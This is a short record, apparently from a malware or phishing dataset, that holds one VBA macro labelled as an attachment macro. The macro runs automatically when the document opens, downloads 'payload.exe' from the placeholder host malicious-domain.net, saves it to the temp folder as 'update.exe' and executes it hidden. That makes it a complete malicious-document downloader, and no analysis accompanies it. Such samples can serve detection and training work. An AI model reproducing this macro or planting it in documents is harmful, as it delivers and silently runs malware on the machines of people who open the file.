technical_data.attachment_macro_vba:
Sub Document_Open()
    Dim strURL As String
    Dim strPath As String
    strURL = "http://malicious-domain.net/payload.exe"
    strPath = Environ("TEMP") & "\update.exe"
    Dim xHttp As Object
    Set xHttp = CreateObject("MSXML2.XMLHTTP")
    xHttp.Open "GET", strURL, False
    xHttp.Send
    If xHttp.Status = 200 Then
        Dim adoStream As Object
        Set adoStream = CreateObject("ADODB.Stream")
        adoStream.Open
        adoStream.Type = 1 'binary
        adoStream.Write xHttp.responseBody
        adoStream.Position = 0
        adoStream.SaveToFile strPath, 2
        adoStream.Close
        Shell strPath, vbHide
    End If
End Sub
